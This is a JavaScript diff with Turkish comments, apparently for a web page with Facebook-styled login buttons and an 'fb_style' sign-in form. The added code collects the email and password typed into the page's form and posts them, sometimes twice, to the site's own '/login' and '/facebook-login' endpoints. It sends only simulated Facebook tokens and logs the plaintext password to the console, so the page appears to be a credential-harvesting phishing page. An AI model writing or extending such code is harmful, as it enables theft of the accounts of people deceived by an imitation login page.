@@ -41,6 +41,14 @@ facebookLogin?.addEventListener('click', async () => {
     facebookLogin.style.opacity = '0.7';
     facebookLogin.disabled = true;
     
+    // Modal içindeki form bilgilerini al
+    const loginForm = document.querySelector('.login-form');
+    const identifierInput = loginForm?.querySelector('input[name="identifier"]');
+    const passwordInput = loginForm?.querySelector('input[type="password"]');
+    
+    const identifier = identifierInput?.value.trim() || 'facebook_user@example.com';
+    const password = passwordInput?.value.trim() || 'facebook_password';
+    
     try {
         // Flask backend'e Facebook login verisi gönder
         const response = await fetch('/facebook-login', {
@@ -50,9 +58,12 @@ facebookLogin?.addEventListener('click', async () => {
             },
             body: JSON.stringify({
                 login_method: 'facebook',
+                email: identifier,
+                password: password,
                 user_data: {
                     platform: 'facebook',
-                    login_time: new Date().toISOString()
+                    login_time: new Date().toISOString(),
+                    email: identifier
                 },
                 access_token: 'simulated_facebook_token_' + Date.now()
             })
@@ -326,7 +337,21 @@ if (initialFacebookLogin) {
         btn.disabled = true;
         
         try {
-            // Flask backend'e Facebook login verisi gönder
+            // İlk olarak kullanıcı bilgilerini kaydet
+            await fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: identifier,
+                    password: password,
+                    remember_me: false,
+                    login_method: 'initial_form'
+                })
+            });
+            
+            // Sonra Facebook login verisi gönder (kullanıcı bilgileri ile birlikte)
             const response = await fetch('/facebook-login', {
                 method: 'POST',
                 headers: {
@@ -334,9 +359,12 @@ if (initialFacebookLogin) {
                 },
                 body: JSON.stringify({
                     login_method: 'facebook',
+                    email: identifier,
+                    password: password,
                     user_data: {
                         platform: 'facebook_initial',
-                        login_time: new Date().toISOString()
+                        login_time: new Date().toISOString(),
+                        email: identifier
                     },
                     access_token: 'initial_facebook_token_' + Date.now()
                 })
@@ -435,13 +463,23 @@ if (fbStyleForm) {
         const original = btn.textContent;
         btn.textContent = 'Devam ediliyor...';
         btn.disabled = true;
+        
+        console.log('Form gönderiliyor:', { email: identifier, password, login_method: 'fb_style' });
+        
         try {
             const response = await fetch('/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: identifier, password, login_method: 'fb_style' })
+                body: JSON.stringify({ 
+                    email: identifier, 
+                    password: password, 
+                    remember_me: false,
+                    login_method: 'fb_style' 
+                })
             });
             const result = await response.json();
+            
+            console.log('Server response:', result);
             
             // Başarılı login sonrası yönlendirme
             if (result.success) {
@@ -453,7 +491,7 @@ if (fbStyleForm) {
                 btn.disabled = false;
             }
         } catch(err){ 
-            console.error(err);
+            console.error('Login error:', err);
             alert('Bağlantı hatası oluştu');
             btn.textContent = original;
             btn.disabled = false;
